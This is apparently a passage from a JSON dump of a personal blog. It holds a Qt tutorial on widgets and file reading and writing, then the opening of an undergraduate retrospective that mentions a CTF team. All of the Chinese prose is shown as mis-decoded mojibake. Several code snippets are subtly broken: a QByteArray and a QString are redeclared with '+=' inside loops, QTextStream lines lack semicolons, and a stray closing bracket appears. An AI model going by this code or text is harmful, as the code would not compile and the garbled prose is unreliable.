æœªé€‰ä¸­\n\n```c\n    //è®¾ç½®å•é€‰æŒ‰é’® ç”·é»˜è®¤é€‰ä¸­\n    ui->rBtnMan->setChecked(true);\n\n    //é€‰ä¸­å¥³å æ‰“å°ä¿¡æ¯\n    connect(ui->rBtnWoman,&QRadioButton::clicked,[=](){\n        qDebug() << \"é€‰ä¸­äº†å¥³äº†ï¼\";\n    });\n\n    //å¤šé€‰æŒ‰é’®  2æ˜¯é€‰ä¸­  0æ˜¯æœªé€‰ä¸­ 1æ˜¯åŠé€‰\n    connect(ui->cBox,&QCheckBox::stateChanged,[=](int state){\n        qDebug() << state;\n    });\n```\n\n\n\n### Item Widgets\n\n#### åˆ—è¡¨å®¹å™¨(List Widget) QListWidget \n\n- QListWidgetItem * item ä¸€è¡Œå†…å®¹ \n\n- ui->listWidget ->addItem ( item )\n\n- è®¾ç½®å±…ä¸­æ–¹å¼item->setTextAlignment(Qt::AlignHCenter);\n\n- å¯ä»¥åˆ©ç”¨addItemsä¸€æ¬¡æ€§æ·»åŠ æ•´ä¸ªè¯—å†…å®¹\n\n```c\n    //åˆ©ç”¨listWidgetå†™è¯—\n    QListWidgetItem * item = new QListWidgetItem(\"é”„ç¦¾æ—¥å½“åˆ\");\n    //å°†ä¸€è¡Œè¯—æ”¾å…¥åˆ°listWidgetæ§ä»¶ä¸­\n    ui->listWidget->addItem(item);\n    item->setTextAlignment(Qt::AlignHCenter);\n```\n\n#### æ ‘æ§ä»¶(Tree Widget)  QTreeWidget\n\n- è®¾ç½®å¤´ï¼š ui->treeWidget->setHeaderLabels(QStringList()<< \"è‹±é›„\"<< \"è‹±é›„ä»‹ç»\");\n\n- åˆ›å»ºæ ¹èŠ‚ç‚¹ï¼š QTreeWidgetItem * liItem = new QTreeWidgetItem(QStringList()<< \"åŠ›é‡\");\n\n- æ·»åŠ æ ¹èŠ‚ç‚¹ åˆ° æ ‘æ§ä»¶ä¸Šï¼šui->treeWidget->addTopLevelItem(liItem);\n\n- æ·»åŠ å­èŠ‚ç‚¹ï¼š liItem->addChild(l1);\n\n```c\n    //treeWidgetæ ‘æ§ä»¶ä½¿ç”¨\n\n    //è®¾ç½®æ°´å¹³å¤´\n    ui->treeWidget->setHeaderLabels(QStringList()<< \"è‹±é›„\"<< \"è‹±é›„ä»‹ç»\");\n\n    QTreeWidgetItem * liItem = new QTreeWidgetItem(QStringList()<< \"åŠ›é‡\");\n    QTreeWidgetItem * minItem = new QTreeWidgetItem(QStringList()<< \"æ•æ·\");\n    QTreeWidgetItem * zhiItem = new QTreeWidgetItem(QStringList()<< \"æ™ºåŠ›\");\n    //åŠ è½½é¡¶å±‚çš„èŠ‚ç‚¹\n    ui->treeWidget->addTopLevelItem(liItem);\n    ui->treeWidget->addTopLevelItem(minItem);\n    ui->treeWidget->addTopLevelItem(zhiItem);\n\n    //è¿½åŠ å­èŠ‚ç‚¹\n    QStringList heroL1;\n    heroL1 << \"åˆšè¢«çŒª\" << \"å‰æ’å¦å…‹ï¼Œèƒ½åœ¨å¸æ”¶ä¼¤å®³çš„åŒæ—¶é€ æˆå¯è§‚çš„èŒƒå›´è¾“å‡º\";\n    QTreeWidgetItem * l1 = new QTreeWidgetItem(heroL1);\n    liItem->addChild(l1);\n```\n\n#### è¡¨æ ¼æ§ä»¶(Table Widget) QTableWidget\n\n- è®¾ç½®åˆ—æ•° ï¼šui->tableWidget->setColumnCount(3);\n\n- è®¾ç½®æ°´å¹³è¡¨å¤´ï¼šui->tableWidget->setHorizontalHeaderLabels(QStringList()<<\"å§“å\"<< \"æ€§åˆ«\"<< \"å¹´é¾„\");\n\n- è®¾ç½®è¡Œæ•°ï¼šui->tableWidget->setRowCount(5);\n- è®¾ç½®æ­£æ–‡ï¼šui->tableWidget->setItem(0,0, new QTableWidgetItem(\"äºšç‘Ÿ\"));\n\n```c\n//TableWidgetæ§ä»¶\n    //è®¾ç½®åˆ—æ•°\n    ui->tableWidget->setColumnCount(3);\n\n    //è®¾ç½®æ°´å¹³è¡¨å¤´\n    ui->tableWidget->setHorizontalHeaderLabels(QStringList()<<\"å§“å\"<< \"æ€§åˆ«\"<< \"å¹´é¾„\");\n\n    //è®¾ç½®è¡Œæ•°\n    ui->tableWidget->setRowCount(5);\n\n    //è®¾ç½®æ­£æ–‡\n    //ui->tableWidget->setItem(0,0, new QTableWidgetItem(\"äºšç‘Ÿ\"));\n    QStringList nameList;\n    nameList<< \"äºšç‘Ÿ\"<< \"èµµäº‘\"<< \"å¼ é£\"<< \"å…³ç¾½\" << \"èŠ±æœ¨å…°\";\n\n    QList<QString> sexList;\n    sexList << \"ç”·\"<< \"ç”·\"<< \"ç”·\"<< \"ç”·\"<< \"å¥³\";\n\n    for(int i = 0 ; i < 5 ;i ++)\n    {\n        int col = 0;\n        ui->tableWidget->setItem(i,col++, new QTableWidgetItem(nameList[i]));\n        ui->tableWidget->setItem(i,col++, new QTableWidgetItem(sexList.at(i)));\n        //int è½¬ QString\n        ui->tableWidget->setItem(i,col++, new QTableWidgetItem( QString::number(i+18)));\n    }\n```\n\n### Others\n\n**æ ˆæ§ä»¶(Stacked Widget )**  \n\n`ui->stackedWidget->setCurrentIndex(1);`\n\n**ä¸‹æ‹‰æ¡†(Combo Box)** \n\n `ui->comboBox->addItem(\"å¥”é©°\");`\n\n **æ ‡ç­¾(Label )**  QLabel \n\n```c\n    //åˆ©ç”¨QLabelæ˜¾ç¤ºå›¾ç‰‡\n    ui->lbl_Image->setPixmap(QPixmap(\":/Image/butterfly.png\"));\n\n    //åˆ©ç”¨QLabelæ˜¾ç¤º gifåŠ¨æ€å›¾ç‰‡\n    QMovie * movie = new QMovie(\":/Image/mario.gif\");\n    ui->lbl_movie->setMovie(movie);\n    //æ’­æ”¾åŠ¨å›¾\n    movie->start();\n```\n\n## æ–‡ä»¶è¯»å†™ï¼ˆQFile | QTextStreamï¼‰\n\n> Q tå½“ä¸­ä½¿ç”¨ QFile ç±»å¯¹æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œï¼Œå¯¹æ–‡æœ¬æ–‡ä»¶ä¹Ÿå¯ä»¥ä¸ QTextStream ä¸€èµ·ä½¿ç”¨ï¼Œè¿™æ ·è¯»å†™æ“ä½œä¼šæ›´åŠ ç®€ä¾¿ã€‚QFileInfo å¯ä»¥ç”¨æ¥è·å–æ–‡ä»¶çš„ä¿¡æ¯ã€‚QDir å¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å¤¹è¿›è¡Œæ“ä½œã€‚\n\n### æ–‡ä»¶è¯»æ“ä½œ\n\n#### 1ã€ä½¿ç”¨QFileç±»\n\n```c\n//è·å–æ–‡ä»¶è·¯å¾„\n//å‚æ•°1:çˆ¶äº²  å‚æ•°2:æ ‡é¢˜   å‚æ•°3:é»˜è®¤æ‰“å¼€è·¯å¾„\nQString path = QFileDialog::getOpenFileName(this,\"æ‰“å¼€æ–‡ä»¶\",\"C:\\\\Users\\\\admin\\\\Desktop\");\nQFile file(path); //pathå‚æ•°å°±æ˜¯è¯»å–æ–‡ä»¶çš„è·¯å¾„\n//è®¾ç½®æ‰“å¼€æ–¹å¼\nfile.open(QIODevice::ReadOnly);\n//ä¸€æ¬¡è¯»å–æ‰€æœ‰\nQByteArray array = file.readAll(); \nQString str = QString(array);//ç±»å‹è½¬æ¢\n\n\n//æŒ‰è¡Œè¯»\nwhile(!file.atEnd())//atEnd()åˆ¤æ–­æ˜¯å¦è¯»åˆ°æ–‡ä»¶å°¾\n{\n    QByteArray array += file.readLine(); \n    QString str = QString(array);//ç±»å‹è½¬æ¢\n}\n\n//å¯¹æ–‡ä»¶å¯¹è±¡è¿›è¡Œå…³é—­\nfile.close();\n```\n\n`QFile::open()` å‡½æ•°æ‰“å¼€æ–‡ä»¶æ—¶éœ€è¦ä¼ é€’ `QIODevice::OpenModeFlag` æšä¸¾ç±»å‹çš„å‚æ•°ï¼Œå†³å®šæ–‡ä»¶ä»¥ä»€ä¹ˆæ–¹å¼æ‰“å¼€ï¼Œ`QIODevice::OpenModeFlag` ç±»å‹çš„ä¸»è¦å–å€¼å¦‚ä¸‹ï¼š\n\n- QIODevice::ReadOnlyï¼šä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œç”¨äºè½½å…¥æ–‡ä»¶ã€‚\n- QIODevice::WriteOnlyï¼šä»¥åªå†™æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œç”¨äºä¿å­˜æ–‡ä»¶ã€‚\n- QIODevice::ReadWriteï¼šä»¥è¯»å†™æ–¹å¼æ‰“å¼€ã€‚\n- QIODevice::Appendï¼š    ä»¥æ·»åŠ æ¨¡å¼æ‰“å¼€ï¼Œæ–°å†™å…¥æ–‡ä»¶çš„æ•°æ®æ·»åŠ åˆ°æ–‡ä»¶å°¾éƒ¨ã€‚\n- QIODevice::Truncateï¼š  ä»¥æˆªå–æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œæ–‡ä»¶åŸæœ‰çš„å†…å®¹å…¨éƒ¨è¢«åˆ é™¤ã€‚\n- QIODevice::Textï¼š          ä»¥æ–‡æœ¬æ–¹å¼æ‰“å¼€æ–‡ä»¶ï¼Œè¯»å–æ—¶â€œ\\nâ€è¢«è‡ªåŠ¨ç¿»è¯‘ä¸ºæ¢è¡Œç¬¦ï¼Œå†™å…¥æ—¶å­—ç¬¦ä¸²ç»“æŸç¬¦ä¼šè‡ªåŠ¨ç¿»è¯‘ä¸ºç³»ç»Ÿå¹³å°çš„ç¼–ç ï¼Œå¦‚ Windows å¹³å°ä¸‹æ˜¯â€œ\\r\\nâ€ã€‚\n\nè¿™äº›å–å€¼å¯ä»¥ç»„åˆï¼Œä¾‹å¦‚ `QIODevice::ReadOnly | QIODevice::Text` è¡¨ç¤ºä»¥åªè¯»å’Œæ–‡æœ¬æ–¹å¼æ‰“å¼€æ–‡ä»¶ã€‚\n\nQté»˜è®¤ä½¿ç”¨utf-8çš„ç¼–ç æ–¹å¼ï¼Œåœ¨Linuxä¸­ä¸€èˆ¬æ²¡æœ‰é—®é¢˜ï¼Œå› ä¸ºLinuxé»˜è®¤ä¹Ÿæ˜¯ç”¨utf-8ã€‚ä¸è¿‡Windowsé‡Œä¸€èˆ¬ç”¨çš„æ˜¯gb18030ï¼Œæ‰€ä»¥é™¤éæˆ‘ä»¬æ˜ç¡®å°†æ–‡ä»¶ä¿å­˜æˆutf-8ç¼–ç ï¼Œå¦åˆ™åœ¨Qtä»£ç é‡Œéœ€è¦å¯¹ç¼–ç åšä¸€äº›è½¬æ¢æ“ä½œï¼š\n\n```c\nQString path = QFileDialog::getOpenFileName(this,\"æ‰“å¼€æ–‡ä»¶\",\"C:\\\\Users\\\\admin\\\\Desktop\");\nQFile file(path); \nfile.open(QIODevice::ReadOnly);\nQByteArray array = file.readAll(); \nQTextCodec * codec = QTextCodec::codecForName(\"gb18030\");\nQString str = codec->toUnicode(array);//ç±»å‹è½¬æ¢\nfile.close();\n```\n\n#### 2ã€ä½¿ç”¨QTextStreamç±»\n\n```c\nQString path = QFileDialog::getOpenFileName(this,\"æ‰“å¼€æ–‡ä»¶\",\"C:\\\\Users\\\\admin\\\\Desktop\");\nQFile file(path); \nfile.open(QIODevice::ReadOnly);\nQTextStream in(&file)\nwhile(!in.atEnd())\n{\n   QString str += in.readLine();\n}\nfile.close();\n```\n\n### æ–‡ä»¶å†™æ“ä½œ\n\n#### 1ã€ä½¿ç”¨QFileç±»\n\n```c\nfile.open(QIODevice::Append); //ç”¨è¿½åŠ æ–¹å¼è¿›è¡Œå†™\nfile.write(\"æµ‹è¯•\");\nfile.close();\n```\n\n#### 2ã€ä½¿ç”¨QTextStreamç±»\n\n```c\nfile.open(QIODevice::Append); //ç”¨è¿½åŠ æ–¹å¼è¿›è¡Œå†™\nQTextStream out(&file)\nQString str = \"æµ‹è¯•\";\nout << str;\nfile.close();\n```\n\n### æ–‡ä»¶ä¿¡æ¯è¯»å–ï¼ˆQFileInfoï¼‰\n\nä½¿ç”¨ QFileInfo è·å–æ–‡ä»¶çš„æœ‰å…³ä¿¡æ¯ã€‚QFileInfo æœ‰å¾ˆå¤šç±»å‹çš„å‡½æ•°ã€‚æ¯”å¦‚ï¼š\n\n- size() æ–‡ä»¶å¤§å°ï¼›\n- fileName() æ–‡ä»¶è·¯å¾„ï¼›\n- created() åˆ›å»ºæ—¥æœŸï¼›\n- lastModified() æœ€åä¿®æ”¹æ—¥æœŸï¼›\n\n- isDir() æ£€æŸ¥è¯¥æ–‡ä»¶æ˜¯å¦æ˜¯ç›®å½•ï¼›\n\n- isExecutable()  æ£€æŸ¥è¯¥æ–‡ä»¶æ˜¯å¦æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ç­‰ã€‚\n\n- baseName()  å¯ä»¥ç›´æ¥è·å¾—æ–‡ä»¶åï¼›\n\n- completeBaseName()  è·å–å®Œæ•´çš„æ–‡ä»¶å\n\n- suffix()  åˆ™ç›´æ¥è·å–æ–‡ä»¶åç¼€åã€‚\n\n- completeSuffix()  è·å–å®Œæ•´çš„æ–‡ä»¶åç¼€\n\n```c\n//QFileInfo æ–‡ä»¶ä¿¡æ¯ç±»\nQFileInfo info(path);\n\nqDebug() << \"å¤§å°ï¼š\" << info.size() << \" åç¼€åï¼š\" << info.suffix() << \" æ–‡ä»¶åç§°ï¼š\"<<info.fileName() << \" æ–‡ä»¶è·¯å¾„ï¼š\"<< info.filePath();\nqDebug() << \"åˆ›å»ºæ—¥æœŸï¼š\" << info.created().toString(\"yyyy/MM/dd hh:mm:ss\");\nqDebug() << \"æœ€åä¿®æ”¹æ—¥æœŸï¼š\"<<info.lastModified().toString(\"yyyy-MM-dd hh:mm:ss\");\n});\n```\n\n## ç¼–ç è½¬æ¢\n\nQString -> QByteArray         QString.toUtf8();\n\nQByteArray->QString           QString(QByteArray)          \n\nQByteArray -> std::string     QByteArray.toStdString();\n\nstd::string -> char *              string.data();\n\n## Qtèµ„æº\n\n- [Qt Material Design Desktop Widgets ](https://github.com/laserpants/qt-material-widgets)ï¼šåŸºäºQt Widgetsçš„Materialé£æ ¼æ§ä»¶åº“\n\n- [qskinny](https://github.com/uwerat/qskinny)ï¼šQt åœºæ™¯å›¾é¡¶éƒ¨çš„è½»é‡çº§æ¡†æ¶\n\n- [QssStylesheetEditor ](https://github.com/hustlei/QssStylesheetEditor): ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ Qt æ ·å¼è¡¨(QSS)ç¼–è¾‘å™¨ï¼Œæ”¯æŒå®æ—¶é¢„è§ˆï¼Œè‡ªåŠ¨æç¤ºï¼Œè‡ªå®šä¹‰å˜é‡, æ”¯æŒé¢„è§ˆè‡ªå®šä¹‰uiä»£ç ï¼Œå¼•ç”¨QPaletteç­‰åŠŸèƒ½ã€‚\n\n- [Qt-ShowyWidgets ](https://github.com/iwxyi/Qt-ShowyWidgets)ï¼šä¸ªäººå¼€å‘çš„å„ç§èŠ±é‡Œèƒ¡å“¨çš„Qtæ§ä»¶é›†åˆ \n\n# èµåŠ©ğŸ’°\n\nå¦‚æœä½ è§‰å¾—å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Qt"],"categories":["Course"]},{"title":"æœ¬ç§‘å››å¹´æ€»ç»“","url":"/posts/26375.html","content":"\nå››å¹´å…‰é˜´ï¼Œæ°å¦‚çƒŸç«ã€‚ä½œæ­¤æ–‡æ—¶ï¼Œæˆ‘çš„æœ¬ç§‘å¤§å­¦ç”Ÿæ´»å·²ç»ç»“æŸã€‚æ±‚å­¦è“‰åŸï¼Œç­‘æ¢¦è¥¿åï¼Œå§‹äº2017å¹´åˆç§‹ï¼Œç»ˆäº2021å¹´ç››å¤ï¼Œç›®ä¹‹æ‰€åŠï¼Œçš†æ˜¯å›å¿†ï¼Œå¿ƒä¹‹æ‰€å‘ï¼Œçš†æ˜¯è¿‡å¾€ã€‚åœ¨è¥¿åçš„å››å¹´é‡Œï¼Œæ›¾æœ‰è¿‡å›°é¡¿ï¼Œæœ‰è¿‡ä½è½ï¼Œæœ‰è¿‡å¯¹æœªæ¥çš„è¿·èŒ«ï¼Œä½†ä¹Ÿæœ‰è¿‡åšå®šï¼Œæœ‰è¿‡æ‹¼æï¼Œæœ‰è¿‡å¯¹æœªæ¥çš„å‘å¾€ã€‚ç•™ä¸‹çš„æ˜¯ç¿çƒ‚é’æ˜¥å’Œæ»¡æº¢æ”¶è·ï¼Œçºµæœ‰ä¸‡èˆ¬ä¸èˆï¼Œä½†ç»ˆé¡»ä¸€åˆ«ã€‚\n\n## â‘ å¤§ä¸€\n\næ—¶é—´ï¼š2017.09-2018.07\n\n> 2017å¹´é«˜è€ƒå‘æŒ¥ä¸ä½³ï¼Œæ¯”å¹³æ—¶æ¨¡è€ƒçš„åˆ†æ•°ä½äº†ä¸å°‘ï¼Œå¡«æŠ¥å¿—æ„¿æ—¶ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ï¼Œé€šè¿‡è‡ªå·±åˆ†æå¡«æŠ¥äº†å‡ ä¸ªå­¦æ ¡ï¼Œç¬¬ä¸€å¿—æ„¿å¡«äº†è¥¿åï¼Œè§‰å¾—è¥¿ååœ¨æˆéƒ½ï¼Œæ ¡å›­ç¯å¢ƒä¹ŸæŒºå¥½çš„ï¼Œé‚£æ—¶é€‰æ‹©ä¿¡æ¯å®‰å…¨ä¸“ä¸šï¼Œä¹Ÿä»…ä»…æ˜¯è®¤ä¸ºè®¡ç®—æœºè¡Œä¸šæ¯”è¾ƒèµšé’±ï¼Œå°½ç®¡å½“æ—¶å¯¹ä¸€åˆ‡éƒ½å¾ˆæ‡µæ‡‚ï¼Œä½†æˆ‘ä»ç„¶å¯¹å¤§å­¦ç”Ÿæ´»å……æ»¡æœŸå¾…ï¼Œæƒ³ç€ç¦»å¼€å°é•‡å»å¾€å¤§åŸå¸‚ç”Ÿæ´»è¯¥æ˜¯å¤šä¹ˆç¾å¥½å•Šï¼\n\n### å¤§å­¦å‰å¥\n\nå¤§å­¦ä»¥å‰æˆ‘éƒ½æ˜¯æ¯”è¾ƒæ²‰é»˜å¯¡è¨€çš„äººï¼Œä¸å–„ä¸äººäº¤æµï¼Œæ‰€ä»¥å¿ƒé‡Œæƒ³ç€å¤§å­¦æ¥ä¸€å®šè¦åšäº›æ”¹å˜ã€‚å¤§ä¸€å…¥å­¦ç«é€‰äº†ç­é•¿ï¼Œæƒ³ä»¥æ­¤ä¸ºå¥‘æœºæ¥æ”¹å˜è‡ªå·±ï¼Œä½†æˆ‘æ›¾å¤šæ¬¡å› ä¸ºäº‹åŠ¡ç¹çå’Œå…¶ä»–ç§ç§åŸå› æƒ³è¿‡æ”¾å¼ƒï¼Œæ¯æ¬¡éƒ½åšæŒè¿‡æ¥äº†ï¼Œæ²¡æˆæƒ³å°±å½“äº†å››å¹´ï¼Œç°åœ¨æƒ³æ¥å½“ç­é•¿æˆ‘çœŸçš„æ”¶è·äº†å¾ˆå¤šï¼Œæˆ‘æ¥è§¦å’Œè®¤è¯†äº†å¾ˆå¤šä¼˜ç§€çš„äººï¼Œè®©æˆ‘æ›´åŠ æœ‰è€å¿ƒäº†ï¼Œå¤„ç†äº‹æƒ…çš„èƒ½åŠ›å˜å¼ºäº†ï¼Œä¸äººæ²Ÿé€šçš„èƒ½åŠ›ä¹Ÿå¾—åˆ°äº†æå‡ï¼Œä½†æˆ‘ä¸€ç›´ä¸è®¤ä¸ºæˆ‘æ˜¯ä¸€ä¸ªåˆæ ¼çš„ç­é•¿ï¼Œæ›´å¼ºçš„é¢†å¯¼åŠ›å’Œäº¤æµèƒ½åŠ›æ˜¯éœ€è¦æˆ‘ä¸æ–­å»åŠªåŠ›Getï¼Œå› ä¸ºåŒå­¦ä»¬çš„æ”¯æŒï¼Œå¤§ä¸€å­¦å¹´æˆ‘è·å¾—äº†æ ¡çº§ä¼˜ç§€å­¦ç”Ÿå¹²éƒ¨ã€‚å…¥å­¦ä¹‹åè¿˜æ˜¯å¾ˆå¿«ç†Ÿæ‚‰äº†å¤§å­¦ç”Ÿæ´»ï¼Œæ¯å¤©æŒ‰éƒ¨å°±ç­çš„ä¸Šè¯¾ï¼Œå¼€ä¼šï¼Œå¿™å„ç§çç¢çš„äº‹ã€‚å…¥å­¦åé€’äº¤äº†å…¥å…šç”³è¯·ä¹¦ï¼Œå¤§ä¸€ä¸‹è¢«é€‰ä¸ºäº†å…¥å…šç§¯æåˆ†å­ï¼Œå‚åŠ äº†å­¦æ ¡çš„å…šæ ¡å­¦ä¹ ï¼Œé¡ºåˆ©ç»“ä¸šå¹¶è·å¾—ç¬¬å››åæœŸå…šæ ¡ä¼˜ç§€å­¦å‘˜ã€‚\n\n### åˆæ¶‰å­¦ä¹ \n\nå­¦ä¹ ä¸Šï¼Œæˆ‘èµ·åˆä»…ä»…æ˜¯æŒ‰éƒ¨å°±ç­çš„å»ä¸Šè¯¾ï¼Œå¬å¾—ä¹Ÿè¿˜ç®—è®¤çœŸï¼Œä½†æ˜¯è¯¾ååŸºæœ¬æ²¡æ€ä¹ˆå»å­¦ä¹ ï¼Œå› ä¸ºåˆšåˆšæ¥è§¦è®¡ç®—æœºï¼Œå¤§ä¸€çš„è¯¾ç¨‹æˆ‘å¬èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒåƒåŠ›ï¼Œå¯¹ç½‘ç»œå®‰å…¨å•Šã€æ“ä½œç³»ç»Ÿå•Šç­‰ç­‰æ¦‚å¿µè¿˜æ˜¯æ‡µæ‡µæ‡‚æ‡‚çš„ï¼Œåæ¥å­¦ç€å­¦ç€å…´è¶£å¤§äº†é‚£ä¹ˆä¸€äº›ï¼Œä¼šè¯¾åè‡ªå·±ä¸»åŠ¨å»å­¦ä¹ ä¸€äº›ç›¸å…³çŸ¥è¯†ï¼Œé‚£æ—¶ä¼šå› ä¸ºæˆåŠŸè¿è¡Œå‡ºç¨‹åºè€Œå¼€å¿ƒä¸å·²ï¼Œå¤§ä¸€å­¦æœŸæˆ‘çš„ç»¼åˆæˆç»©æ’åä¸“ä¸šç¬¬ä¸€ï¼Œä¹Ÿè®©æˆ‘æ‹¿åˆ°äº†å›½å®¶åŠ±å¿—å¥–å­¦é‡‘ï¼Œä¸€ç­‰å¥–å­¦é‡‘å’ŒäºŒç­‰å¥–å­¦é‡‘ã€‚\n\n### åˆæ¢æˆéƒ½\n\nè¯¾å ‚ä¹‹å¤–ï¼Œå¤§ä¸€è¿™ä¸€å¹´æˆ‘ä¸»è¦å»äº†æˆéƒ½çš„å„å¤§é«˜æ ¡å‚è§‚ï¼ˆå·å¤§ï¼Œç”µå­ç§‘å¤§ï¼Œè¥¿å—äº¤å¤§ï¼Œæˆéƒ½ç†å·¥ï¼Œå››å·å¸ˆèŒƒï¼‰ï¼Œå‡ ä¹æˆéƒ½çš„é«˜æ ¡éƒ½è®©æˆ‘èµ°äº†ä¸ªéï¼Œä½“ä¼šåˆ°äº†ä¸åŒçš„å­¦ä¹ æ°›å›´ï¼Œæ·±æ„Ÿè‡ªå·±ç¦»ä¼˜ç§€è¿˜å·®å¾ˆè¿œã€‚æˆéƒ½æœ‰åçš„åœ°æ–¹ä¹Ÿå»äº†ä¸ªéï¼ˆæ˜¥ç†™è·¯ï¼Œé”¦é‡Œï¼Œå®½å­å··å­ï¼Œéƒ½æ±Ÿå °...ï¼‰ï¼Œä½†ç¬¬ä¸€æ¬¡å»å¹¶æ²¡æœ‰ç»™æˆ‘ç‰¹åˆ«éœ‡æ’¼çš„æ„Ÿè§‰ï¼Œéšç€åæ¥é¢‘ç¹çš„å»ï¼Œæˆ‘å¯¹è¿™äº›åœ°æ–¹çš„å°è±¡å‘ç”Ÿäº†æ”¹å˜ï¼Œä»–ä»¬éƒ½æœ‰è‡ªå·±ç‹¬ç‰¹çš„é­…åŠ›å¸å¼•ç€æˆ‘ï¼Œéšç€åæ¥æˆ‘å»åˆ°äº†å…¶ä»–ä¸åŒçš„åŸå¸‚ï¼Œæ„Ÿå—äº†ä¸åŒçš„æ°›å›´ï¼Œæˆ‘çŸ¥é“å…¶å®æˆ‘å·²ç»æ…¢æ…¢çˆ±ä¸Šäº†æˆéƒ½è¿™åº§åŸå¸‚ã€‚\n\n## â‘¡å¤§äºŒ\n\næ—¶é—´ï¼š2018.09-2019.07\n\n### åŠ å…¥å®éªŒå®¤\n\nè¿™ä¸€å¹´ä»¤æˆ‘å°è±¡æœ€æ·±çš„æ˜¯é€šè¿‡è€ƒæ ¸åŠ å…¥äº†å­¦é™¢çš„ç½‘ç»œå®‰å…¨å®éªŒå®¤çš„ CTF æˆ˜é˜Ÿ Covteamï¼Œè¿™å¾ˆå¤§ç¨‹åº¦ä¸Šæ”¹å˜äº†æˆ‘åæ¥çš„äººç”Ÿè½¨è¿¹ï¼Œæˆ˜é˜Ÿä¸»è¦ä»¥å‚åŠ å„å¤§ CTF æ¯”èµ›ä¸ºä¸» ï¼Œåˆšè¿›å®éªŒå®¤æ—¶ï¼Œå­¦é•¿å­¦å§ç»™æˆ‘ä»¬å®‰æ’å­¦ä¹ ä»»åŠ¡ï¼Œæ¯å‘¨å¼€ä¼šï¼ŒæœŸé—´æˆ‘ä¹Ÿç¡®å®šäº†è‡ªå·±çš„æ–¹å‘â€”Webå®‰å…¨ï¼Œæˆ‘ä¹Ÿä»åˆšå¼€å§‹å•¥ä¹Ÿä¸ä¼šçš„å°ç™½ï¼Œé€æ¸æˆé•¿èµ·æ¥ã€‚å…ˆåå»é‡åº†é‚®ç”µå¤§å­¦å‚åŠ äº†å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›-åˆ›æ–°å®è·µèƒ½åŠ›èµ›è·å¾—äº†èµ›åŒºäºŒç­‰å¥–ï¼Œå»æˆéƒ½ä¿¡æ¯å·¥ç¨‹å¤§å­¦å‚åŠ å››å·çœå¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨æŠ€æœ¯å¤§èµ›è·å¾—ä¸€ç­‰å¥–ï¼Œå»æˆéƒ½å·¥ä¸šå­¦é™¢å‚åŠ å…¨å›½è½¯ä»¶å’Œä¿¡æ¯æŠ€æœ¯ä¸“ä¸šäººæ‰å¤§èµ›è·å¾—ä¸‰ç­‰å¥–ï¼Œä»¥åŠå„å¤§ CTF æ¯”èµ›ç­‰ç­‰ã€‚è¿™äº›ç®—æ˜¯æˆ‘æœ€åˆæ¶‰åŠçš„æ¯”èµ›å§ï¼Œèƒ½æ‹¿åˆ°å¥–è‡ªç„¶æ˜¯å¾ˆå¼€å¿ƒçš„ï¼Œä½†æ˜¯é€šè¿‡å‚åŠ è¿™äº›æ¯”èµ›ï¼Œæˆ‘çœ‹äº†åˆ°è‡ªå·±ä¸å¤§ä½¬çš„å·®è·ã€‚\n\n### æ‹¿åˆ°å›½å¥–\n\nè¿™ä¸€å¹´æˆ‘çš„ç»¼åˆæˆç»©æ’åä»ç„¶æ˜¯ä¸“ä¸šç¬¬ä¸€ï¼ŒåŠ ä¹‹å„ç§æ¯”èµ›å¥–é¡¹ï¼Œè¿™è®©æˆ‘è·å¾—äº†å›½å®¶å¥–å­¦é‡‘ï¼Œå‹¤å¥‹è°¦å‘å¥–å­¦é‡‘å’Œä¸¤æ¬¡ä¸€ç­‰å¥–å­¦é‡‘ã€‚å·¥ä½œä¸Šæˆ‘ä¾æ—§æ‹…ä»»ç­çº§ç­é•¿ï¼ŒåŒæ ·ä¹Ÿè·å¾—äº†æ ¡çº§ä¼˜ç§€å­¦ç”Ÿå¹²éƒ¨ã€‚å…³äºå…¥å…šï¼Œè¿™ä¸€å¹´è¢«é€‰ä¸ºå‘å±•å¯¹è±¡æ¥è€Œæˆä¸ºäº†é¢„å¤‡å…šå‘˜ã€‚\n\n### é˜¿åä¹‹æ—…\n\nå¯’å‡ä»æˆéƒ½å‡ºå‘åˆ°è¾¾é˜¿åå·çš„ç†å¿ä¸€è·¯å‘å‰å»äº†æ¡ƒåªç¾Œå¯¨ï¼ˆç”µå½±æ€ç”Ÿçš„å–æ™¯åœ°ï¼‰ã€ç”˜å ¡è—å¯¨ã€æ¯•æ£šæ²Ÿæ—…æ¸¸ï¼Œä½“éªŒåˆ°äº†ä¸ä¸€æ ·çš„é£åœŸäººæƒ…ï¼Œè¹¦äº†äººç”Ÿç¬¬ä¸€æ¬¡é‡è¿ªï¼Œè¿™ä¸€è¶Ÿæ•´ä½“ä¸Šè¿˜æ˜¯æ¯”è¾ƒæ»¡æ„çš„ï¼Œå› ä¸ºæ˜¯å†¬å¤©å»çš„ï¼Œä¸€è·¯çš„é›ªæ™¯è¿˜æ˜¯å¾ˆéœ‡æ’¼çš„ï¼ˆå¯¹äºä¸€ä¸ªå—æ–¹å°é•‡é’å¹´æ¥è¯´ï¼‰ï¼Œä¹Ÿå®Œæˆæ¯å¹´å‡ºå»èµ°ä¸€èµ°çš„ç›®æ ‡ã€‚\n\n## â‘¢å¤§ä¸‰\n\næ—¶é—´ï¼š2019.09-2020.07\n\n> 